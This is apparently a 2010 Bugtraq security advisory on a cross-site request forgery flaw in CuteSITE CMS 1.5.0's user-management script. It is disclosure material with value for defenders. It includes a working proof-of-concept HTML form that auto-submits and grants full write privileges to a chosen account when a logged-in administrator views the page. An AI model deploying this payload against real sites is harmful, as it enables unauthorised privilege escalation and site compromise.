
Date: Sat, 5 Jun 2010 16:43:49 +0200 (CEST)
From: advisory@...ridge.ch
To: bugtraq@...urityfocus.com
Subject: XSRF (CSRF) in CuteSITE CMS

Vulnerability ID: HTB22395
Reference: http://www.htbridge.ch/advisory/xsrf_csrf_in_cutesite_cms.html
Product: CuteSITE CMS
Vendor: AMT Company
Vulnerable Version: 1.5.0 and Probably Prior Versions
Vendor Notification: 20 May 2010 
Vulnerability Type: CSRF (Cross-Site Request Forgery)
Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
Risk level: Low 
Credit: High-Tech Bridge SA (http://www.htbridge.ch/) 

Vulnerability Details:
The vulnerability exists due to failure in the "/manage/add_user.php" script to properly verify the source of HTTP request. 

Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data. 

Attacker can use browser to exploit this vulnerability. The following PoC is available: 


<FORM action="http://host/manage/add_user.php" method="POST" name="main">
<input type="hidden" name="fld_priv" value="W">
<input type="hidden" name="tpl_priv" value="W">
<input type="hidden" name="img_priv" value="W">
<input type="hidden" name="str_priv" value="W">
<input type="hidden" name="txt_priv" value="W">
<input type="hidden" name="var_priv" value="W">
<input type="hidden" name="snp_priv" value="W">
<input type="hidden" name="usr_priv" value="W">
<input type="hidden" name="hst_priv" value="W">
<input type="hidden" name="plg_priv" value="W">

<INPUT type="hidden" name="user_id" value="33">
<INPUT type="hidden" name="user_login" value="userlogin">
<INPUT type="hidden" name="action" value="Modify">
</FORM>
<script>
document.main.submit()
</script>



